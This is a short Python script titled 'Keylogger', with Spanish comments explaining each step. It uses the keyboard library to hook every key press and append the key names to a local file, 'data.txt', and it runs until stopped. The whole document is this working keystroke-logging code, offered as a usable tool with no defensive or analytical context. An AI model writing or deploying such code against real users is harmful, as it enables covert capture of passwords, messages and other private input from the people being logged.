# Keylogger

# Instalar la librería necesaria con: pip install keyboard
# Importar la librería para detectar las pulsaciones de teclas
import keyboard

# Función que se ejecuta cada vez que se presiona una tecla
def pressedKeys(key):
    # Abrir (o crear) el archivo 'data.txt' en modo de adición ('a')
    with open('data.txt', 'a') as file:
        # Si la tecla presionada es la barra espaciadora, agregar un espacio en el archivo
        if key.name == 'space':
            file.write(' ')
        else:
            # Agregar el nombre de la tecla presionada al archivo
            file.write(key.name)

# Asignar la función pressedKeys para ejecutarse en cada pulsación de tecla
keyboard.on_press(pressedKeys)

# Mantener el programa en ejecución esperando eventos de teclado
keyboard.wait()
